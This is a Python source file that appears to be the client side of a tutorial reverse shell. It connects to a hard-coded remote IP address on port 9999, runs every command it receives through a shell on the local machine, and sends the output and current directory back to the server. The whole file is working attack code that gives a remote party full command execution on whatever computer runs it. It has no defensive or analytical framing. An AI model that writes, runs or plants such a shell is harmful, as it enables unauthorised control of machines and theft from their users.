import socket
import os
import subprocess

s = socket.socket()
#host = "192.168.254.14" # IP address of the server (or local host)
host = "64.227.51.101" # IP address of an instance of Digital Ocean server
port = 9999

s.connect((host, port))

# Note: Some commands give output while others don't (such as cd ..)
while True:
    data = s.recv(1024)
    # Decodes from bytes to string. Checks if the first two characters are cd
    if data[:2].decode("utf-8") == "cd":
        # Execute that cd command on client's computer. Change the directory
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        # Open up the process (terminal) using Popen()
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # Two types of bytes available: Byte and String
        # Combine both output and error into output_byte
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        # To also send the current working directory to server
        currentWD = os.getcwd() + "> "  # Just add the greater than character like in Terminal
        # Send it to server
        s.send(str.encode(output_str + currentWD))

        print(output_str) # Just printing out client's side as well
